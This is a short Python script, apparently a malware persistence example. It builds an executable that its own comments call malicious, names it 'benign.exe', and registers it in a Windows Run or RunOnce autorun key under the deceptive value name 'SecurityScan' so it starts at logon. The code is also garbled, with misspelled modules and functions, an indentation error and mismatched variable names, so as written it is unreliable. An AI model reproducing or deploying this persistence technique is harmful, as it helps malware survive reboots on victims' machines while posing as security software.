import os, shututil, winreg

filedir = os.path.join(os.getcwd(), "Temp")
filename = "benign.exe"
filepath = os.path.join(filedir, filename)

if os.path.isfile(filepath):
    os.remove(filepath)

# Use Buildexe to create malicious executable
os.system("python buildexe.py")

# Move malicious executable to desired directory
shututil.move(filename, filedir)

# Windows default auotrun keys:
# HKEY_CURRENT_USER\Software\Miscrosoft\Windows\CurrentVersion\Run
# HKEY_CURRENT_USER\Software\Miscrosoft\Windows\CurrentVersion\RunOnce
# HKEY_LOCAL_MACHINE\Software\Miscrosoft\Windows\CurrentVersion\Run
# HKEY_LOCAL_MACHINE\Software\Miscrosoft\Windows\CurrentVersion\RunOnce

regkey = 1

uf regkey < 2:
reghive = winreg.HKEY_CURRENT_USER
else:
    reghive = winreg.HKEY_LOCAL_MACHINE

if (regkey % 2 == 0):
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

else:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" 

# Add registry autorun key
rej = winreg.ConnecRegistry(None, reghive)
key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(key, "SecurityScan", 0 , winreg.REG_SZ, filepath)
